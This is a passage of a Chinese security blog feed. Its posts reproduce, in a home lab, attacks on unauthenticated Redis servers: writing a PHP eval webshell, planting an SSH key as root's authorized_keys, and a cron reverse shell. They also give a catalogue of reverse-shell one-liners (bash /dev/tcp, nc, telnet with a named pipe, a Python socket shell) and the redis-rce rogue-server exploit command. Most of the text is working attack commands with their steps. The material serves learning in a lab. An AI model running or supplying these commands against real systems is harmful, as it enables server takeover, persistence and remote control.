redis-benchmark redis-cli redis-server /usr/bin/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">启动</span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608170601093.png"></p><h2 id="redis漏洞复现"><a href="#redis漏洞复现" class="headerlink" title="redis漏洞复现"></a>redis漏洞复现</h2><p><strong>注意这里的攻击机是kali，手受害机是Ubuntu</strong></p><h3 id="1-未授权访问"><a href="#1-未授权访问" class="headerlink" title="1.未授权访问"></a>1.未授权访问</h3><p>Ubuntu打开redis服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p><img src="https://pic.bamboo22.top/image-20230608215752374.png"></p><p>kali这边无密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608215723959.png"></p><h3 id="2-利用redis漏洞写webshell"><a href="#2-利用redis漏洞写webshell" class="headerlink" title="2.利用redis漏洞写webshell"></a>2.利用redis漏洞写webshell</h3><p><strong>利用前提：</strong></p><ul><li><p>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</p></li><li><p>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（开启web服务器，就可以利用url使用蚁剑进行连接）</p></li></ul><p><strong>上传webshell:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">config get dir #查看redis数据库路径</span><br><span class="line">config set dir /tmp #修改靶机Redis数据库路径</span><br><span class="line">config set dbfilename</span><br><span class="line">config set dbfilename 22.php #生成22.php文件</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;#将一句话木马写入文件中</span><br><span class="line">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span><br><span class="line">save#保存</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;#上传木马可以通过蚁剑连接</span><br><span class="line">save#保存</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608222941674.png"></p><p>可以看到shell已经被写入</p><p><img src="http://pic.bamboo22.top/image-20230608222706342.png"></p><h3 id="3-利用公私钥获取root权限"><a href="#3-利用公私钥获取root权限" class="headerlink" title="3.利用公私钥获取root权限"></a>3.利用公私钥获取root权限</h3><p><strong>ssh秘钥连接：</strong></p><p>大家都知道可以通过ssh远程登录另外一台电脑。ssh登录有两种一个是密码登录，一个是密钥登录，我们主要看密钥登录是什么流程，公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：</p><ol><li>客户端生成RSA公钥和私钥</li><li>客户端将自己的公钥存放到服务器</li><li>客户端请求连接服务器，服务器将一个随机字符串发送给客户端</li><li>客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</li><li>服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。</li></ol><p><strong>前提：</strong></p><ol><li><strong>当redis以root身份运行</strong>。</li><li>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证。</li><li>存在&#x2F;root&#x2F;.ssh目录，如果不存在我们可以通过一句话木马连接蚁剑创建目录不过可能进不去root目录权限问题可能或者自己mkdir一个目录毕竟是自己搭建靶场。因为.ssh是隐藏目录可以通过ls -la查看有没有。</li></ol><p><strong>操作：</strong></p><p>靶机:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf    #开启redis服务</span><br><span class="line">mkdir /root/.ssh                #创建ssh公钥存放目录（靶机是作为ssh服务器使用的）</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609172912345.png"></p><p><img src="http://pic.bamboo22.top/image-20230608224252809.png"></p><p>攻击机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa   #生成ssh私钥和公钥，密码为空</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609163032554.png"></p><p><strong>攻击机：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd .ssh/          #进入.ssh目录</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; 1.txt  #将生成的公钥保存到1.txt：</span><br><span class="line">cat 1.txt | redis-cli -h 192.168.144.130 -x set crack   #连接靶机的Redis，将刚生成的公钥1.txt写入redis</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609163327360.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130   #攻击机连接靶机redis：</span><br><span class="line">使用 config get dir 命令得到redis备份的路径，更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）并设置上传公钥的备份文件名字为authorized_keys：</span><br><span class="line">config get dir</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609164013668.png"></p><p>如果出现<code>(error) ERR Changing directory: Permission denied</code>，则说明redis没有以root权限运行，注意攻击机、靶机都要以root权限运行</p><p><img src="http://pic.bamboo22.top/image-20230609164103222.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用ssh免密登录到靶机：ssh -i id_rsa root@192.168.144.130</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609172036593.png"></p><p>成功登录靶机root账户</p><p>我在复现的时候最后一步遇到这个问题</p><p><img src="http://pic.bamboo22.top/image-20230609172200320.png"></p><p>这个问题是因为靶机没又开启ssh-server，参考大佬解决方案<a href="http://t.csdn.cn/9boV8">ssh提示Connection refused的解决方案</a></p><h3 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h3><h4 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><p>在攻击者服务器上监听一个端口（未被占用的任意端口）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>连接redis，写入反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.144.130/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609220933226.png"></p><p><img src="http://pic.bamboo22.top/image-20230609220828144.png"></p><p>可以看到已经成功写入反弹信息，但是还是无法反弹shell，这个问题应该是利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。试了很多次都没有执行成功。</p><h4 id="利用redis主从复制反弹shell"><a href="#利用redis主从复制反弹shell" class="headerlink" title="利用redis主从复制反弹shell"></a>利用redis主从复制反弹shell</h4><p><strong>redis主从复制：</strong></p><p>redis主从复制我们简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会影响数据完整性，且读写分开，减轻服务器压力。</p><p><strong>操作：</strong></p><p>如果要是的利用成功需要先下载攻击代码，这里还有注意如果利用redis主从复制redis版本要是4.x或者5.x,因为我都kali里有docker，所以用Ubuntu攻击kali</p><p><strong>拉取镜像</strong></p><p>首先拉取一个5.0镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search redis5.0    //查找镜像</span><br><span class="line">docker pull damonevking/redis5.0   //拉取下图第三个镜像</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230611223902216.png"></p><p><img src="http://pic.bamboo22.top/image-20230611223944013.png"><br><strong>运行容器</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 6379:6379 -d damonevking/redis5.0 redis-server   //映射端口并运行容器</span><br></pre></td></tr></table></figure><p>访问你的ip+6379端口，如下图则说明搭建成功</p><p><img src="http://pic.bamboo22.top/1200.png"></p><p><strong>漏洞利用：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Ridter/redis-rce.git   //下载漏洞利用脚本</span><br></pre></td></tr></table></figure><p>注意，这里少一个.so的文件，到<a href="https://github.com/n0b0dyCN/redis-rogue-server%E4%B8%8B%E8%BD%BD%E5%B9%B6%E6%94%BE%E5%88%B0%E5%92%8Credis-rce.py%E5%90%8C%E4%B8%80%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%A7%E8%A1%8C%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%EF%BC%9A">https://github.com/n0b0dyCN/redis-rogue-server下载并放到和redis-rce.py同一目录下，然后执行如下命令：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rce.py -r 192.168.144.128 -L 192.168.144.130 -f exp.so</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230612171921307.png"></p><p>复现成功</p><p>复现的时候遇到问题redis的6379端口一直被占用，用kill -9命令删除后又会新开启一个端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis            //查找正在运行的redis进程</span><br></pre></td></tr></table></figure><p>解决方法是直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/redis-server stop  //停止redis服务</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2024/01/22/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>反弹shell</strong>：控制端监听某个端口，被控制端发起请求到该端口，并将命令行的输入输出传到控制端</p><p><strong>正向getshell</strong>: 控制端(也就是我们自己的机器)发送请求去连接被控端(目标机器)的方式。<br>不过这种方式会受到防火墙,路由,等各种很多因素影响,很难成功。</p><p><img src="http://pic.bamboo22.top/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjExMjMw,size_16,color_FFFFFF,t_70.png"></p><p><strong>反弹shell</strong>: 被控端主动发送请求连接我们的控制端。<br>这种方法是可以想办法避开防火墙和路由的一些限制的!</p><p><img src="http://pic.bamboo22.top/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjExMjMw,size_16,color_FFFFFF,t_70-16861419258613.png"></p><p><strong>为什么需要反弹shell？</strong></p><p>当正向连接不可达时候</p><ul><li>客户机中了木马，但是在局域网内，无法正向连接。</li><li>由于防火墙和局域网的限制，对方只能发送请求，不可主动接受请求</li></ul><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="bash反弹："><a href="#bash反弹：" class="headerlink" title="bash反弹："></a>bash反弹：</h4><p>这是最常见也是最简单的一种反弹shell的方式，直接看命令：</p><p>攻击机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 1231</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.144.128/1231 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607190252137.png"></p><p><img src="http://pic.bamboo22.top/image-20230607192139651.png"></p><p><img src="http://pic.bamboo22.top/image-20230607192057903.png"></p><p>实现命令执行</p><p><img src="http://pic.bamboo22.top/image-20230607204242802.png"></p><h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h4><h5 id="e被阉割的情况："><a href="#e被阉割的情况：" class="headerlink" title="e被阉割的情况："></a>e被阉割的情况：</h5><p>先说一下不用nc -e 这个选项的时候，我们应该怎么做：</p><p>攻击机器开启两个端口的监听：（为什么要开两个，这个下面会讲）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666 </span><br><span class="line">nc -lvp 7777 </span><br></pre></td></tr></table></figure><p>受害机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.144.128 6666|/bin/bash|nc 192.168.144.128 7777</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="http://pic.bamboo22.top/image-20230607204210160.png"></p><p><img src="http://pic.bamboo22.top/image-20230607194016234.png"></p><p>首先我们连接到6666端口进行通信，然后把通信的内容作为输入放到&#x2F;bin&#x2F;bash解释器里面去，再把解释器运行出来的内容作为输入通信到7777端口，于是就有了上述的画面。</p><p>注意：这里报错信息不会回显在攻击机上，但是可以看到被攻击机执行了命令，并在本机上显示</p><h5 id="nc-e"><a href="#nc-e" class="headerlink" title="nc-e"></a>nc-e</h5><p>目前大部分linux版本都阉割了-e选项，因为实在是有点危险<br>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、下载安装</span><br><span class="line">wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span><br><span class="line">tar -zxvf netcat-0.7.1.tar.gz -C /usr/local</span><br><span class="line">cd /usr/local</span><br><span class="line">mv netcat-0.7.1 netcat</span><br><span class="line">cd /usr/local/netcat</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">2、配置</span><br><span class="line">vim /etc/profile</span><br><span class="line">添加以下内容：</span><br><span class="line"># set  netcat path</span><br><span class="line">export NETCAT_HOME=/usr/local/netcat</span><br><span class="line">export PATH=$PATH:$NETCAT_HOME/bin</span><br><span class="line">保存，退出，并使配置生效：</span><br><span class="line">source /etc/profile</span><br><span class="line">3、测试</span><br><span class="line">nc -help成功</span><br></pre></td></tr></table></figure><p>接下来直接展示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">受害机：nc -e /bin/bash 192.168.28.128 7777   或者： netcat 192.168.28.128 7777 -e /bin/bash</span><br><span class="line">攻击机：nc -lvp 7777</span><br></pre></td></tr></table></figure><p>关于nc -e选项的解释：<br>主要关键词：连接 、重定向、执行<br>连接就执行并且重定向结果到连接机器的端口</p><p>这个在安装那步报错了，还没试验成功</p><h4 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h4><h5 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h5><p>这里Telnet主要是起到一个连接的作用（删除管道通过rm -f xx 即可）</p><p>攻击机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod a p; telnet 192.168.144.128 2333 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607200737619.png"></p><p><img src="http://pic.bamboo22.top/image-20230607200750970.png"></p><p>攻击机上的playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure><p>mknod：创建一个管道，telnet 连接通信并且把输入重定向到管道a中去，1&gt;a，把输出重定向到管道a中去<br>如果说这个管道符号不好理解的话，那就看看下面这个</p><h5 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5><p>这个方法和上面nc -e 被阉割的方法一样，都是开启两个监听，然后通过不断的重定向符号反弹shell</p><p>攻击机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666  nc -lvp 7777</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.144.128 6666 | /bin/bash | telnet 192.168.144.128 7777</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607201410059.png"></p><h4 id="python脚本弹shell"><a href="#python脚本弹shell" class="headerlink" title="python脚本弹shell"></a>python脚本弹shell</h4><p>攻击机： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><p>受害机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.144.128&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230607202343268.png"></p><p><img src="http://pic.bamboo22.top/image-20230607204140241.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/01/22/%E8%A7%A3%E5%86%B3Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/"/>
      <url>/2024/01/22/%E8%A7%A3%E5%86%B3Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="解决Ubuntu计划任务弹shell失败"><a href="#解决Ubuntu计划任务弹shell失败" class="headerlink" title="解决Ubuntu计划任务弹shell失败"></a>解决Ubuntu计划任务弹shell失败</h1><p>在复现redis时几种情况都复现成功了，只有计划任务弹shell没有成功，今天就来探究一下</p><p>当时的情况是：</p><p>已经成功写入反弹信息，但是还是无法反弹shell，</p><p>当时推测应该是利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。试了很多次都没有执行成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.144.130/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609220933226.png"></p><p><img src="http://pic.bamboo22.top/image-20230609220828144.png"></p><h2 id="问题汇总"><a href="#问题汇总" class="headerlink" title="问题汇总"></a>问题汇总</h2><ul><li><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>为什么在ubuntu默认终端上反弹shell没有用？而在centos上就行？</li><li>ubuntu为什么将上述命令写入脚本运行在上就可以反弹？</li><li>centos与ubuntu的计划任务有何不同？</li><li>&#x2F;etc&#x2F;cron与&#x2F;var&#x2F;spool&#x2F;cron有什么区别？</li><li>sh、dash、bash有啥区别？</li></ul><h2 id="一些基础"><a href="#一些基础" class="headerlink" title="一些基础"></a>一些基础</h2><h3 id="常用命令以及参数"><a href="#常用命令以及参数" class="headerlink" title="常用命令以及参数"></a>常用命令以及参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -e#编辑计划任务</span><br><span class="line">crontab -l #列出计划任务</span><br><span class="line">crontab -r#删除计划任务</span><br></pre></td></tr></table></figure><h3 id="相关目录"><a href="#相关目录" class="headerlink" title="相关目录"></a>相关目录</h3><p>centos计划任务目录：<code>/var/spool/cron/</code></p><p>ubuntu计划任务目录：<code>/var/spool/cron/crontabs/</code></p><p>计划任务日志(系统日志)：<code>/var/log/syslog</code></p><p>具体的举例用法可以参考菜鸟教程：<a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></p><h3 id="etc-crontab-和-var-spool-cron区别"><a href="#etc-crontab-和-var-spool-cron区别" class="headerlink" title="&#x2F;etc&#x2F;crontab 和 &#x2F;var&#x2F;spool&#x2F;cron区别"></a>&#x2F;etc&#x2F;crontab 和 &#x2F;var&#x2F;spool&#x2F;cron区别</h3><p><code>/etc/crontab</code>（系统级的）系统执行计划</p><p><code>/var/spool/cron/</code>（用户级的）这个目录是以账号来区分每个用户自己的执行计划</p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m:分钟 - 从0到59的整数</span><br><span class="line">h:小时 - 从0到23的整数</span><br><span class="line">dom:天 - 从1到31的整数 (必须是指定月份的有效日期)</span><br><span class="line">mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份)</span><br><span class="line">dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)</span><br><span class="line">user:指的是执行命令的用户</span><br><span class="line">command: 需要执行的命令</span><br><span class="line">星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次</span><br><span class="line">符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务</span><br></pre></td></tr></table></figure><h2 id="CentOS计划任务弹shell"><a href="#CentOS计划任务弹shell" class="headerlink" title="CentOS计划任务弹shell"></a>CentOS计划任务弹shell</h2><p>既然说CentOS计划任务是可以成功的，那我们就先来在CentOS上试一试</p><h3 id="法一：crontab-e写入命令"><a href="#法一：crontab-e写入命令" class="headerlink" title="法一：crontab -e写入命令"></a>法一：crontab -e写入命令</h3><p>centos机器上，输入<code>crontab -e</code>就会出现一个文件，可以看到这是一个临时的缓存文件，写入下方命令并保存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab -e  写入：</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1</span><br><span class="line">或者</span><br><span class="line">*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230624210727691.png"></p><p>这时候使用<code>crontab -l</code>命令，就可以看到我们定的计划任务了。</p><p><img src="http://pic.bamboo22.top/image-20230624210656113.png"></p><p>同时可以看到在<code>/var/spool/cron</code>目录下多了一个文件为<code>root</code>，里面的内容就是刚才写入的bash反弹命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /var/spool/cron</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230630100804098.png"></p><p>一分钟左右就会弹回来</p><p><img src="http://pic.bamboo22.top/image-20230624211005391.png"></p><h3 id="法二：echo写入文件"><a href="#法二：echo写入文件" class="headerlink" title="法二：echo写入文件"></a>法二：echo写入文件</h3><p>上面的<code>crontab -e</code>方式其实就是帮我们在<code>/var/spool/cron</code>目录下创建了一个<code>root</code>文件而已；所以可以尝试直接使用<code>echo</code>命令来写入<code>bash</code>反弹命令到这个文件中，即下方命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27; &gt; /var/spool/cron/root</span><br><span class="line">或者</span><br><span class="line">echo &#x27;*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27; &gt; /var/spool/cron/root</span><br></pre></td></tr></table></figure><p>先使用<code>crontab -r</code>删除计划任务，随后输入上方命令<code>echo</code>写入计划任务成功反弹。</p><p><img src="http://pic.bamboo22.top/image-20230624212032751.png"></p><p>这里注意：**<code>/var/spool/cron/</code> 目录下存放的是每个用户包括<code>root</code>的<code>crontab</code>任务，每个任务以创建者的名字命名。**</p><h3 id="法三：crontab-e写入文件"><a href="#法三：crontab-e写入文件" class="headerlink" title="法三：crontab -e写入文件"></a>法三：crontab -e写入文件</h3><p>我们知道<code>bash</code>反弹<code>shell</code>除了直接输入命令，还可以将命令写入<code>sh</code>文件，然后<code>bash</code>运行。那么我新建一个<code>/tmp/1.sh</code>写入<code>bash</code>反弹命令，然后再向计划任务中写入这个文件，也是可以成功弹回的。</p><p>CentOS:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/spool/cron</span><br><span class="line">vim /tmp/1.sh</span><br><span class="line">输入反弹命令</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1</span><br><span class="line">echo &#x27;*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27; &gt; /var/spool/cron/root</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230624213018646.png"></p><p><img src="http://pic.bamboo22.top/image-20230624212839070.png"></p><p>同样反弹成功</p><p><strong>注意：写入的文件最好统一为绝对路径，不建议相对路径。</strong></p><h3 id="法四：echo写入命令和文件到-etc-crontab"><a 